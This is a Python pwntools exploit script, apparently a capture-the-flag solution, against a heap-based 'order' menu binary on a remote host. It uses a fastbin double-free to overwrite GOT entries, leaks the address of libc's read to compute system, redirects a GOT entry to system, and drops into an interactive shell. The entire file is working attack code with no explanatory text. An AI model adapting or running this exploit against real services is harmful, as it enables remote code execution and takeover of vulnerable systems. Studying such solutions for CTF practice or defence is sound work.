from pwn import *

DEBUG = False

context.log_level = 'debug'

libc = ELF('./libc-2.23.so')

if DEBUG:
    env = os.environ
    env['LD_PRELOAD'] = './libc-2.23.so'
    p = process('./mybin', env=env)
else:
    p = remote('202.112.51.217', 22567)

def add_order(payload):
    p.recvuntil('5.Exit\n')
    p.sendline('1')
    p.send(payload)
    
def show_order(index):
    p.recvuntil('5.Exit\n')
    p.sendline('2')
    p.recvuntil('index:')
    p.sendline(str(index))
    return p.recvuntil('1.Add    order\n', drop=True)

def edit_order(index, payload):
    p.recvuntil('5.Exit\n')
    p.sendline('3')
    p.recvuntil('index:')
    p.sendline(str(index))
    p.send(payload)

def del_order(index):
    p.recvuntil('5.Exit\n')
    p.sendline('4')
    p.recvuntil('index:')
    p.sendline(str(index))

p.recvuntil("What's your name:")
p.send('/bin/sh\x00' + 'A' * 16 + p32(0) + p32(0x29)[:3])

add_order('ls')
add_order('ls')
add_order('ls')
del_order(0)
del_order(1)
del_order(0)
add_order(p32(0x0804A060+24))
add_order('ls')
add_order('ls')
add_order(p32(0x08048420))

edit_order(6, p32(0x0804A010))

read_addr = u32(show_order(0)[:4])

system_addr = read_addr - libc.symbols['read'] + libc.symbols['system']

free_hook = libc.symbols['__free_hook']

edit_order(6, p32(0x0804A014))

edit_order(0, p32(system_addr))

print hex(u32(show_order(0)[:4]))

edit_order(6, p32(0x0804A060))

p.interactive()




